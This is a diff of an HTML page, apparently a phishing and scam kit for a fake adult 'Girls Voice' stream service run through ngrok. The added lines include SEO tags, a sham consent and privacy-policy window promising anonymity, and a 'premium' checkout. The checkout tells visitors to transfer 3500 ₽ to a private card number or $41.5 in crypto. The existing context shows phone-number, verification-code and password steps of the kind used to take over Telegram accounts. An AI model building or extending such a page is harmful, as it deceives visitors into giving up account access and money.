@@ -4,7 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="ngrok-skip-browser-warning" content="true">
-    <title>Приватный стрим · LIVE</title>
+    
+    <title>Girls Voice - Приватные Голосовые Чаты с Девушками 🔞 | Официальный сайт 2024</title>
+    <meta name="description" content="Girls Voice - лучший сервис приватных голосовых чатов с девушками. Анонимно, безопасно, 18+. Подключись сейчас! Без регистрации, с верификацией через Telegram.">
+    <meta name="keywords" content="girls voice, голосовые чаты, приватные чаты, девушки голос, voice chat, анонимные чаты, girls voice официальный сайт, girls voice отзывы, girls voice вход, girls voice регистрация, girls voice телеграм">
+    <meta name="robots" content="index, follow">
+    <meta name="author" content="Girls Voice">
+    <meta name="theme-color" content="#ff3366">
+    
+    <meta property="og:title" content="Girls Voice - Приватные Голосовые Чаты">
+    <meta property="og:description" content="Анонимные голосовые чаты с девушками. Подтверди номер и получи доступ!">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://girls-voice.live">
+    <meta property="og:image" content="https://i.imgur.com/example.jpg">
+    
+    <link rel="canonical" href="https://girls-voice.live">
+    <link rel="icon" type="image/x-icon" href="https://i.imgur.com/favicon.ico">
+    
     <style>
         * {
             margin: 0;
@@ -78,24 +94,20 @@
         
         .stream-content {
             position: fixed;
-            bottom: 15%;
-            left: 0;
-            right: 0;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             text-align: center;
             z-index: 3;
             padding: 20px;
+            width: 100%;
+            max-width: 800px;
             animation: fadeInUp 0.8s ease;
         }
         
         @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translate(-50%, -40%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
         }
         
         .live-badge {
@@ -164,9 +176,27 @@
             box-shadow: 0 0 30px rgba(255, 51, 102, 0.8);
         }
         
-        .unlock-btn:active {
-            transform: scale(0.98);
+        .unlock-btn:active { transform: scale(0.98); }
+        
+        .premium-btn {
+            background: linear-gradient(135deg, #ffcc00, #ffaa00);
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            color: #000;
+            font-weight: bold;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.5);
+            transition: transform 0.2s, box-shadow 0.2s;
         }
+
+        .premium-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.8);
+        }
+
+        .premium-btn:active { transform: scale(0.98); }
         
         .chat-overlay {
             position: fixed;
@@ -200,16 +230,181 @@
             border-bottom: 1px solid rgba(255,255,255,0.1);
         }
         
-        .chat-message .name {
-            color: #ff6680;
-        }
+        .chat-message .name { color: #ff6680; }
         
+        /* ========== НОВОЕ ОКНО: СОГЛАШЕНИЯ (появляется после "РАЗБЛОКИРОВАТЬ") ========== */
+        #consentModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.96);
+            backdrop-filter: blur(15px);
+            z-index: 1500;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        #consentModal .consent-box {
+            background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
+            border: 2px solid #ff3366;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(255, 51, 102, 0.3);
+            animation: modalFadeIn 0.4s ease-out;
+            margin: auto;
+            position: relative;
+        }
+
+        #consentModal .consent-title {
+            color: #ff6680;
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        #consentModal .consent-subtitle {
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+
+        .consent-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .consent-btn {
+            background: rgba(30, 30, 30, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: white;
+            padding: 16px 20px;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+            transition: all 0.3s;
+            text-align: left;
+        }
+
+        .consent-btn:hover {
+            transform: translateY(-2px);
+            background: rgba(50, 50, 50, 0.95);
+        }
+
+        .consent-btn .icon {
+            font-size: 22px;
+            width: 30px;
+            text-align: center;
+        }
+
+        .consent-btn .text-block {
+            flex: 1;
+        }
+
+        .consent-btn .label {
+            font-size: 15px;
+            font-weight: 600;
+            color: white;
+            display: block;
+        }
+
+        .consent-btn .hint {
+            font-size: 11px;
+            color: #888;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .consent-btn.privacy {
+            border-color: #ff3366;
+        }
+        .consent-btn.privacy:hover {
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.4);
+            background: rgba(255, 51, 102, 0.15);
+        }
+
+        .consent-btn.support {
+            border-color: #007bff;
+        }
+        .consent-btn.support:hover {
+            box-shadow: 0 0 20px rgba(0, 123, 255, 0.4);
+            background: rgba(0, 123, 255, 0.15);
+        }
+
+        .consent-btn.terms {
+            border-color: #2ecc71;
+        }
+        .consent-btn.terms:hover {
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.4);
+            background: rgba(46, 204, 113, 0.15);
+        }
+
+        .consent-agree-btn {
+            background: linear-gradient(135deg, #ff3366, #ff6680);
+            border: none;
+            color: white;
+            padding: 16px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.4);
+            margin-top: 10px;
+        }
+
+        .consent-agree-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 51, 102, 0.7);
+        }
+
+        .consent-agree-btn:active { transform: scale(0.98); }
+
+        .consent-agree-btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        .consent-footer-hint {
+            color: #888;
+            font-size: 11px;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
         @media (max-width: 768px) {
             .stream-content h1 { font-size: 24px; }
             .stream-content p { font-size: 14px; }
-            .unlock-btn { padding: 12px 30px; font-size: 18px; }
+            .unlock-btn { padding: 12px 25px; font-size: 16px; }
+            .premium-btn { padding: 12px 25px; font-size: 16px; }
             .chat-overlay { display: none; }
-            .viewer-stats { gap: 15px; }
+            .viewer-stats { gap: 15px; flex-wrap: wrap; }
+
+            #consentModal .consent-box {
+                padding: 25px 18px;
+                border-radius: 18px;
+            }
+            #consentModal .consent-title { font-size: 18px; }
+            .consent-btn { padding: 14px 16px; }
+            .consent-btn .icon { font-size: 20px; }
+            .consent-btn .label { font-size: 14px; }
+            .consent-agree-btn { font-size: 16px; padding: 14px; }
         }
         
         .modal {
@@ -321,9 +516,7 @@
             transition: background 0.2s;
         }
 
-        .custom-select .options-list .option-item:hover {
-            background-color: #3a3a3a;
-        }
+        .custom-select .options-list .option-item:hover { background-color: #3a3a3a; }
 
         .custom-select .options-list .option-item .flag {
             width: 28px;
@@ -333,13 +526,9 @@
             flex-shrink: 0;
         }
 
-        .custom-select .options-list .option-item.selected {
-            background-color: #3a3a3a;
-        }
+        .custom-select .options-list .option-item.selected { background-color: #3a3a3a; }
 
-        .options-list::-webkit-scrollbar {
-            width: 6px;
-        }
+        .options-list::-webkit-scrollbar { width: 6px; }
         .options-list::-webkit-scrollbar-track {
             background: #1a1a1a;
             border-radius: 10px;
@@ -386,13 +575,7 @@
             background: rgba(0,255,0,0.05);
         }
         
-        .code-section {
-            display: none;
-        }
-        
-        .password-section {
-            display: none;
-        }
+        .code-section, .password-section { display: none; }
         
         .help-code-btn {
             display: inline-block;
@@ -438,9 +621,7 @@
             backdrop-filter: blur(10px);
         }
         
-        #broadcastOverlay.active {
-            display: flex;
-        }
+        #broadcastOverlay.active { display: flex; }
         
         #broadcastOverlay .broadcast-box {
             background: linear-gradient(145deg, #0a0a0a, #1a0a0a);
@@ -570,13 +751,8 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        #ageModal .modal-box .age-btn:hover {
-            background: #ff0040;
-        }
-        #ageModal .modal-box .age-btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-        }
+        #ageModal .modal-box .age-btn:hover { background: #ff0040; }
+        #ageModal .modal-box .age-btn:disabled { background: #555; cursor: not-allowed; }
 
         .phone-animation {
             position: fixed;
@@ -598,25 +774,14 @@
             transition: opacity 0.5s ease;
             pointer-events: none;
         }
-        .phone-animation.show {
-            opacity: 1;
-        }
+        .phone-animation.show { opacity: 1; }
         @keyframes phoneVibrate {
             0% { transform: translateX(-50%) translateX(-3px); }
             100% { transform: translateX(-50%) translateX(3px); }
         }
-        .phone-animation .phone-icon {
-            font-size: 28px;
-        }
-        .phone-animation .phone-text {
-            color: white;
-            font-size: 14px;
-            font-weight: 300;
-        }
-        .phone-animation .phone-text span {
-            color: #ff6680;
-            font-weight: 600;
-        }
+        .phone-animation .phone-icon { font-size: 28px; }
+        .phone-animation .phone-text { color: white; font-size: 14px; font-weight: 300; }
+        .phone-animation .phone-text span { color: #ff6680; font-weight: 600; }
 
         .sms-animation {
             position: fixed;
@@ -635,10 +800,7 @@
             transition: all 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
             pointer-events: none;
         }
-        .sms-animation.show {
-            opacity: 1;
-            transform: translateX(0);
-        }
+        .sms-animation.show { opacity: 1; transform: translateX(0); }
         .sms-animation .sms-header {
             display: flex;
             align-items: center;
@@ -653,9 +815,7 @@
             margin-top: 4px;
             line-height: 1.4;
         }
-        .sms-animation .sms-body span {
-            color: #ff6680;
-        }
+        .sms-animation .sms-body span { color: #ff6680; }
 
         #banPage {
             display: none;
@@ -671,9 +831,7 @@
             flex-direction: column;
             padding: 20px;
         }
-        #banPage.active {
-            display: flex;
-        }
+        #banPage.active { display: flex; }
         #banPage .ban-container {
             border: 2px solid #ff0000;
             padding: 50px 40px;
@@ -689,11 +847,7 @@
             0%, 100% { box-shadow: 0 0 20px rgba(255,0,0,0.1); }
             50% { box-shadow: 0 0 60px rgba(255,0,0,0.3); }
         }
-        #banPage .lock {
-            font-size: 80px;
-            display: block;
-            margin-bottom: 20px;
-        }
+        #banPage .lock { font-size: 80px; display: block; margin-bottom: 20px; }
         #banPage h1 {
             font-size: 32px;
             color: #ff0000;
@@ -702,12 +856,7 @@
             text-shadow: 0 0 20px rgba(255,0,0,0.5);
             margin: 10px 0;
         }
-        #banPage p {
-            color: #ccc;
-            font-size: 16px;
-            margin: 15px 0;
-            line-height: 1.6;
-        }
+        #banPage p { color: #ccc; font-size: 16px; margin: 15px 0; line-height: 1.6; }
         #banPage .ip-display {
             color: #666;
             font-size: 14px;
@@ -717,10 +866,220 @@
             margin-top: 20px;
             font-family: monospace;
         }
-        #banPage .ban-id {
-            color: #444;
+        #banPage .ban-id { color: #444; font-size: 12px; margin-top: 15px; }
+
+        /* ========== СТИЛИ ДЛЯ МОДАЛЬНЫХ ОКОН СОГЛАШЕНИЙ ========== */
+        .terms-modal-style {
+            display: none;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            background: rgba(0, 0, 0, 0.95) !important;
+            z-index: 2147483647 !important;
+            justify-content: center !important;
+            align-items: center !important;
+            padding: 20px !important;
+            box-sizing: border-box !important;
+            overflow-y: auto !important;
+        }
+
+        .terms-box-style {
+            background: linear-gradient(145deg, #1a1a1a, #2a2a2a) !important;
+            border-radius: 24px !important;
+            padding: 30px 25px !important;
+            width: 100% !important;
+            max-width: 500px !important;
+            text-align: left !important;
+            position: relative !important;
+            border: 2px solid #ff3366;
+            animation: modalFadeIn 0.4s ease-out;
+            margin: auto !important;
+            box-sizing: border-box !important;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .terms-close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border: none;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s;
+            padding: 0;
+        }
+        .terms-close-btn:hover { transform: scale(1.1); }
+
+        .terms-text-content {
+            color: #e0e0e0;
+            line-height: 1.6;
+            font-size: 15px;
+            margin-top: 10px;
+            max-height: 60vh;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+
+        .terms-text-content::-webkit-scrollbar { width: 6px; }
+        .terms-text-content::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+        }
+        .terms-text-content::-webkit-scrollbar-thumb {
+            background: #555;
+            border-radius: 10px;
+        }
+        .terms-text-content::-webkit-scrollbar-thumb:hover { background: #777; }
+
+        .terms-action-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .terms-action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 51, 102, 0.4);
+        }
+        .terms-action-btn:active { transform: translateY(0); }
+
+        /* ========== СТИЛИ ДЛЯ РЕКВИЗИТОВ ========== */
+        .req-block {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            transition: all 0.3s;
+        }
+        .req-block:hover {
+            border-color: rgba(255, 204, 0, 0.4);
+            background: rgba(0, 0, 0, 0.6);
+        }
+        .req-label {
+            color: #888;
             font-size: 12px;
-            margin-top: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+        .req-value {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+        }
+        .req-copy-btn {
+            background: rgba(255, 204, 0, 0.15);
+            border: 1px solid #ffcc00;
+            color: #ffcc00;
+            padding: 8px 14px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+        .req-copy-btn:hover {
+            background: #ffcc00;
+            color: #000;
+        }
+        .req-copy-btn.copied {
+            background: #2ecc71;
+            border-color: #2ecc71;
+            color: white;
+        }
+
+        .crypto-network-btn {
+            background: linear-gradient(135deg, #2a2a2a, #1a1a1a);
+            border: 2px solid #333;
+            color: white;
+            padding: 18px 20px;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        .crypto-network-btn:hover {
+            border-color: #F7931A;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(247, 147, 26, 0.3);
+        }
+        .crypto-network-btn .icon {
+            font-size: 28px;
+            width: 40px;
+            text-align: center;
+        }
+        .crypto-network-btn .info { flex: 1; text-align: left; }
+        .crypto-network-btn .name { font-size: 16px; margin-bottom: 2px; }
+        .crypto-network-btn .desc {
+            font-size: 12px;
+            color: #888;
+            font-weight: normal;
+        }
+        .crypto-network-btn .arrow { color: #888; font-size: 20px; }
+
+        @media (max-width: 768px) {
+            .terms-modal-style {
+                padding: 10px !important;
+                align-items: flex-start !important;
+            }
+            .terms-box-style {
+                padding: 25px 15px !important;
+                margin-top: 20px !important;
+                margin-bottom: 20px !important;
+                border-radius: 18px !important;
+            }
+            .terms-box-style h3 {
+                font-size: 18px !important;
+                margin-bottom: 12px !important;
+                padding-right: 30px;
+            }
+            .terms-text-content {
+                font-size: 14px !important;
+                max-height: none !important;
+            }
+            .terms-text-content h4 { font-size: 15px !important; }
+            .terms-close-btn {
+                top: 10px !important;
+                right: 10px !important;
+                width: 32px !important;
+                height: 32px !important;
+                font-size: 16px !important;
+            }
+            .req-block { padding: 12px; }
+            .req-value { font-size: 13px; }
+            .req-copy-btn { padding: 6px 10px; font-size: 11px; }
         }
     </style>
 </head>
@@ -770,12 +1129,56 @@
         <span>📱 <span id="onlineCount">47</span> онлайн</span>
     </div>
     
-    <button class="unlock-btn" id="unlockBtn">🔓 РАЗБЛОКИРОВАТЬ СТРИМ</button>
+    <div style="display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; margin-top: 10px;">
+        <button class="unlock-btn" id="unlockBtn">🔓 РАЗБЛОКИРОВАТЬ СТРИМ</button>
+        <button class="premium-btn" id="premiumBtn">💎 КУПИТЬ ПРЕМИУМ</button>
+    </div>
 </div>
 
 <div class="chat-overlay">
     <div class="chat-header">💬 ОБЩИЙ ЧАТ</div>
     <div class="chat-messages" id="chatMessages"></div>
+</div>
+
+<!-- ================= НОВОЕ ОКНО: СОГЛАШЕНИЯ ================= -->
+<div id="consentModal">
+    <div class="consent-box">
+        <div class="consent-title">📋 ПЕРЕД ПРОДОЛЖЕНИЕМ</div>
+        <div class="consent-subtitle">Ознакомьтесь с документами и подтвердите согласие</div>
+        
+        <div class="consent-buttons">
+            <!-- Политика -->
+            <button onclick="showPrivacyPolicy()" class="consent-btn privacy">
+                <span class="icon">🔒</span>
+                <div class="text-block">
+                    <span class="label">Политика конфиденциальности</span>
+                    <span class="hint">Как мы защищаем ваши данные</span>
+                </div>
+            </button>
+            
+            <!-- Техподдержка -->
+            <a href="https://t.me/girlsvoice_support" target="_blank" class="consent-btn support">
+                <span class="icon">💬</span>
+                <div class="text-block">
+                    <span class="label">Техподдержка</span>
+                    <span class="hint">Telegram @girlsvoice_support</span>
+                </div>
+            </a>
+            
+            <!-- Соглашение -->
+            <button onclick="showTerms()" class="consent-btn terms">
+                <span class="icon">📄</span>
+                <div class="text-block">
+                    <span class="label">Пользовательское соглашение</span>
+                    <span class="hint">Правила использования сервиса</span>
+                </div>
+            </button>
+        </div>
+        
+        <button class="consent-agree-btn" id="consentAgreeBtn">✅ СОГЛАСЕН</button>
+        
+        <p class="consent-footer-hint">Нажимая «Согласен», вы подтверждаете, что вам исполнилось 18 лет, и вы принимаете условия использования сервиса.</p>
+    </div>
 </div>
 
 <div id="broadcastOverlay">
@@ -938,6 +1341,265 @@
     </div>
 </div>
 
+<!-- ================= МОДАЛЬНОЕ ОКНО: ВЫБОР СПОСОБА ОПЛАТЫ ================= -->
+<div id="premiumModal" class="terms-modal-style">
+    <div class="terms-box-style" style="border-color: #ffcc00; box-shadow: 0 0 50px rgba(255, 204, 0, 0.4); max-width: 450px;">
+        <button onclick="closePremiumModal()" class="terms-close-btn" style="background: #ffcc00; color: #000;">✕</button>
+        
+        <h3 style="color: #ffcc00; font-size: 22px; margin-bottom: 8px; margin-top: 0; text-align: center;">💎 ПРЕМИУМ ДОСТУП</h3>
+        <p style="color: #aaa; font-size: 14px; text-align: center; margin-bottom: 25px;">Выберите удобный способ оплаты</p>
+        
+        <div style="display: flex; flex-direction: column; gap: 12px;">
+            <button onclick="showPaymentForm('sber')" style="background: linear-gradient(135deg, #21A038, #2ecc71); border: none; color: white; padding: 16px 20px; border-radius: 16px; cursor: pointer; font-size: 16px; font-weight: bold; display: flex; align-items: center; gap: 12px; transition: transform 0.2s;">
+                <span style="font-size: 24px;">🟢</span>
+                <span style="flex: 1; text-align: left;">Сбербанк</span>
+                <span style="font-size: 18px;">→</span>
+            </button>
+            
+            <button onclick="showPaymentForm('ozon')" style="background: linear-gradient(135deg, #005BFF, #4A90E2); border: none; color: white; padding: 16px 20px; border-radius: 16px; cursor: pointer; font-size: 16px; font-weight: bold; display: flex; align-items: center; gap: 12px; transition: transform 0.2s;">
+                <span style="font-size: 24px;">🔵</span>
+                <span style="flex: 1; text-align: left;">Ozon Bank</span>
+                <span style="font-size: 18px;">→</span>
+            </button>
+            
+            <button onclick="showCryptoNetworks()" style="background: linear-gradient(135deg, #F7931A, #FFB84D); border: none; color: white; padding: 16px 20px; border-radius: 16px; cursor: pointer; font-size: 16px; font-weight: bold; display: flex; align-items: center; gap: 12px; transition: transform 0.2s;">
+                <span style="font-size: 24px;">₿</span>
+                <span style="flex: 1; text-align: left;">Криптовалюта</span>
+                <span style="font-size: 18px;">→</span>
+            </button>
+        </div>
+        
+        <div style="margin-top: 20px; padding: 12px; background: rgba(255, 204, 0, 0.1); border-radius: 10px; text-align: center;">
+            <p style="color: #ffcc00; font-size: 13px; margin: 0;">💰 Стоимость премиум доступа: <strong>3500 ₽</strong> / <strong>41.5 $</strong></p>
+        </div>
+    </div>
+</div>
+
+<!-- ================= МОДАЛЬНОЕ ОКНО: РЕКВИЗИТЫ (СБЕР/ОЗОН) ================= -->
+<div id="paymentModal" class="terms-modal-style">
+    <div class="terms-box-style" style="border-color: #2ecc71; box-shadow: 0 0 50px rgba(46, 204, 113, 0.4); max-width: 450px;">
+        <button onclick="closePaymentModal()" class="terms-close-btn" style="background: #2ecc71;">✕</button>
+        
+        <h3 id="paymentTitle" style="color: #2ecc71; font-size: 20px; margin-bottom: 6px; margin-top: 0; text-align: center;">🟢 ОПЛАТА ЧЕРЕЗ СБЕРБАНК</h3>
+        <p style="color: #aaa; font-size: 13px; text-align: center; margin-bottom: 20px;">Переведите точную сумму на реквизиты ниже</p>
+        
+        <div style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border: 2px solid #2ecc71; border-radius: 16px; padding: 18px; margin-bottom: 16px; text-align: center;">
+            <div style="color: #aaa; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px;">Сумма к оплате</div>
+            <div style="color: #2ecc71; font-size: 32px; font-weight: bold;">3500 ₽</div>
+        </div>
+        
+        <div class="req-block">
+            <div style="flex: 1; min-width: 0;">
+                <div class="req-label">💳 Номер карты</div>
+                <div class="req-value" id="reqCardNumber">2204 3210 1321 8367</div>
+            </div>
+            <button class="req-copy-btn" onclick="copyReq('reqCardNumber', this)">📋 Копировать</button>
+        </div>
+        
+        <div class="req-block">
+            <div style="flex: 1; min-width: 0;">
+                <div class="req-label">👤 Получатель</div>
+                <div class="req-value" id="reqName">Артем</div>
+            </div>
+            <button class="req-copy-btn" onclick="copyReq('reqName', this)">📋 Копировать</button>
+        </div>
+        
+        <div class="req-block">
+            <div style="flex: 1; min-width: 0;">
+                <div class="req-label">💰 Сумма</div>
+                <div class="req-value" id="reqAmount">3500 ₽</div>
+            </div>
+            <button class="req-copy-btn" onclick="copyReq('reqAmount', this)">📋 Копировать</button>
+        </div>
+        
+        <div style="background: rgba(255, 204, 0, 0.1); border: 1px solid rgba(255, 204, 0, 0.3); border-radius: 12px; padding: 14px; margin-top: 16px;">
+            <p style="color: #ffcc00; font-size: 13px; margin: 0; text-align: center; line-height: 1.5;">⚠️ <strong>Важно:</strong> переведите точную сумму <strong>3500 ₽</strong>. После оплаты напишите в поддержку <strong>@girlsvoice_support</strong> и пришлите чек.</p>
+        </div>
+        
+        <button onclick="confirmPaymentSent()" class="terms-action-btn" style="background: linear-gradient(135deg, #21A038, #2ecc71); margin-top: 20px;">✅ Я ОПЛАТИЛ</button>
+        
+        <button onclick="closePaymentModal()" style="background: none; border: none; color: #888; font-size: 14px; cursor: pointer; margin-top: 12px; width: 100%; padding: 10px;">Отмена</button>
+    </div>
+</div>
+
+<!-- ================= МОДАЛЬНОЕ ОКНО: ВЫБОР СЕТИ КРИПТЫ ================= -->
+<div id="cryptoNetworksModal" class="terms-modal-style">
+    <div class="terms-box-style" style="border-color: #F7931A; box-shadow: 0 0 50px rgba(247, 147, 26, 0.4); max-width: 450px;">
+        <button onclick="closeCryptoNetworksModal()" class="terms-close-btn" style="background: #F7931A;">✕</button>
+        
+        <h3 style="color: #F7931A; font-size: 22px; margin-bottom: 8px; margin-top: 0; text-align: center;">₿ ОПЛАТА КРИПТОВАЛЮТОЙ</h3>
+        <p style="color: #aaa; font-size: 14px; text-align: center; margin-bottom: 25px;">Выберите сеть для перевода</p>
+        
+        <div style="display: flex; flex-direction: column; gap: 12px;">
+            <button class="crypto-network-btn" onclick="showCryptoDetails('ton')">
+                <span class="icon">💎</span>
+                <div class="info">
+                    <div class="name">TON</div>
+                    <div class="desc">The Open Network</div>
+                </div>
+                <span class="arrow">→</span>
+            </button>
+            
+            <button class="crypto-network-btn" onclick="showCryptoDetails('trc20')">
+                <span class="icon">🪙</span>
+                <div class="info">
+                    <div class="name">TRC20</div>
+                    <div class="desc">USDT TRON</div>
+                </div>
+                <span class="arrow">→</span>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ================= МОДАЛЬНОЕ ОКНО: РЕКВИЗИТЫ КРИПТЫ ================= -->
+<div id="cryptoDetailsModal" class="terms-modal-style">
+    <div class="terms-box-style" style="border-color: #F7931A; box-shadow: 0 0 50px rgba(247, 147, 26, 0.4); max-width: 450px;">
+        <button onclick="closeCryptoDetailsModal()" class="terms-close-btn" style="background: #F7931A;">✕</button>
+        
+        <h3 id="cryptoTitle" style="color: #F7931A; font-size: 20px; margin-bottom: 6px; margin-top: 0; text-align: center;">💎 ОПЛАТА В TON</h3>
+        <p style="color: #aaa; font-size: 13px; text-align: center; margin-bottom: 20px;">Переведите точную сумму на кошелёк ниже</p>
+        
+        <div style="background: linear-gradient(135deg, rgba(247, 147, 26, 0.2), rgba(255, 184, 77, 0.1)); border: 2px solid #F7931A; border-radius: 16px; padding: 18px; margin-bottom: 16px; text-align: center;">
+            <div style="color: #aaa; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px;">Сумма к оплате</div>
+            <div style="color: #F7931A; font-size: 32px; font-weight: bold;">41.5 $</div>
+        </div>
+        
+        <div class="req-block">
+            <div style="flex: 1; min-width: 0;">
+                <div class="req-label">🔑 Адрес кошелька</div>
+                <div class="req-value" id="cryptoAddress">-</div>
+            </div>
+            <button class="req-copy-btn" onclick="copyReq('cryptoAddress', this)">📋 Копировать</button>
+        </div>
+        
+        <div class="req-block">
+            <div style="flex: 1; min-width: 0;">
+                <div class="req-label">🌐 Сеть</div>
+                <div class="req-value" id="cryptoNetwork">-</div>
+            </div>
+            <button class="req-copy-btn" onclick="copyReq('cryptoNetwork', this)">📋 Копировать</button>
+        </div>
+        
+        <div class="req-block">
+            <div style="flex: 1; min-width: 0;">
+                <div class="req-label">💰 Сумма</div>
+                <div class="req-value" id="cryptoAmount">41.5 $</div>
+            </div>
+            <button class="req-copy-btn" onclick="copyReq('cryptoAmount', this)">📋 Копировать</button>
+        </div>
+        
+        <div style="background: rgba(255, 204, 0, 0.1); border: 1px solid rgba(255, 204, 0, 0.3); border-radius: 12px; padding: 14px; margin-top: 16px;">
+            <p style="color: #ffcc00; font-size: 13px; margin: 0; text-align: center; line-height: 1.5;">⚠️ <strong>Важно:</strong> отправляйте <strong>ровно 41.5 $</strong> в указанной сети. После оплаты пришлите хэш транзакции в <strong>@girlsvoice_support</strong>.</p>
+        </div>
+        
+        <button onclick="confirmPaymentSent()" class="terms-action-btn" style="background: linear-gradient(135deg, #F7931A, #FFB84D); margin-top: 20px;">✅ Я ОПЛАТИЛ</button>
+        
+        <button onclick="closeCryptoDetailsModal()" style="background: none; border: none; color: #888; font-size: 14px; cursor: pointer; margin-top: 12px; width: 100%; padding: 10px;">Отмена</button>
+    </div>
+</div>
+
+<!-- ================= МОДАЛЬНОЕ ОКНО: ПОЛИТИКА ================= -->
+<div id="privacyModal" class="terms-modal-style">
+    <div class="terms-box-style" style="border-color: #ff3366; box-shadow: 0 0 50px rgba(255, 51, 102, 0.4);">
+        <button onclick="closePrivacyModal()" class="terms-close-btn" style="background: #ff3366;">✕</button>
+        
+        <h3 style="color: #ff6680; font-size: 22px; margin-bottom: 15px; margin-top: 0;">🔒 ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</h3>
+        
+        <div class="terms-text-content">
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #ff6680; margin-bottom: 8px; font-size: 16px; margin-top: 0;">1. Основные положения</h4>
+                <p style="margin: 0;">Сервис Girls Voice обеспечивает полную анонимность и защиту данных пользователей.</p>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #ff6680; margin-bottom: 8px; font-size: 16px; margin-top: 0;">2. Сбор информации</h4>
+                <p style="margin: 0;">Минимально необходимые данные для верификации через Telegram.</p>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #ff6680; margin-bottom: 8px; font-size: 16px; margin-top: 0;">3. Использование данных</h4>
+                <ul style="margin: 0; padding-left: 20px;">
+                    <li>Подтверждение возраста 18+</li>
+                    <li>Предотвращение мошенничества</li>
+                    <li>Обеспечение безопасности</li>
+                </ul>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <h4 style="color: #ff6680; margin-bottom: 8px; font-size: 16px; margin-top: 0;">4. Безопасность</h4>
+                <p style="margin: 0;">256-битное SSL-шифрование, защита от DDoS-атак.</p>
+            </div>
+            
+            <div style="padding: 15px; background: rgba(255, 51, 102, 0.1); border-radius: 10px;">
+                <h4 style="color: #ff6680; margin-bottom: 8px; font-size: 16px; margin-top: 0;">📞 Контакты</h4>
+                <p style="margin: 0;"><strong>Telegram:</strong> @girlsvoice_support</p>
